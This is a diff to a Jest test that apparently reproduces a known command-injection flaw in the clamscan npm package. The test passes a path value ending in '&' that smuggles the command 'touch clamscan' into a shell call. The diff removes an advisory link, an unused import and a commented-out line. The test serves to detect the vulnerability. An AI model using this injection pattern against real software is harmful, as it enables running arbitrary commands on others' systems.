@@ -1,10 +1,8 @@
-//https://snyk.io/vuln/SNYK-JS-CLAMSCAN-564113
 test("Command Injection in clamscan", () => {
   expect.assertions(2);
   const Root = require("clamscan");
   const fs = require("fs");
   const path = "./clamscan";
-  const sleep = require("sleep");
   try {
     if (fs.existsSync(path)) {
       fs.unlinkSync(path);
@@ -18,7 +16,6 @@ test("Command Injection in clamscan", () => {
   var attack_code = "touch clamscan";
   var root = new Root();
   fs.mkdir(attack_code + "&", function () {});
-  // root.init({"clamscan": {'path': attack_code + "&"}});
   return root
     .init({ clamscan: { path: attack_code + "&" } })
     .then(() => {})
